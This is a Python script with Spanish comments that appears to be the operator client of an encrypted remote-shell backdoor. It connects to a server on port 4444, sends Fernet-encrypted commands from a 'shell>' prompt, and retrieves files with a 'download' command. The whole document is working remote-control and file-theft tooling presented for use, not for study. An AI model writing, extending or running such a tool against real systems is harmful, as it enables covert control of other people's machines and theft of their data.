import socket
from cryptography.fernet import Fernet

# Usar la misma clave que el servidor
KEY = b"..."  # Reemplaza con la clave generada por el servidor
cipher_suite = Fernet(KEY)

def connect_to_server(host, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((host, port))
        print(f"[+] Connected to {host}:{port}")

        while True:
            command = input("shell> ")
            if command.lower() in ["exit", "quit"]:
                break

            # Encriptar el comando
            encrypted_command = cipher_suite.encrypt(command.encode())

            # Enviar el comando encriptado
            client_socket.send(encrypted_command)

            if command.startswith("download"):
                # Recibir el archivo descargado
                encrypted_file_data = client_socket.recv(4096)
                file_data = cipher_suite.decrypt(encrypted_file_data)
                with open("downloaded_file", "wb") as f:
                    f.write(file_data)
                print("[+] File downloaded.")
                continue

            # Recibir la salida encriptada
            encrypted_output = client_socket.recv(4096)

            # Desencriptar y mostrar la salida
            output = cipher_suite.decrypt(encrypted_output).decode()
            print(output)

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client_socket.close()
        print("[-] Connection closed.")

if __name__ == "__main__":
    HOST = "127.0.0.1"  # Reemplaza con la IP del servidor
    PORT = 4444
    connect_to_server(HOST, PORT)
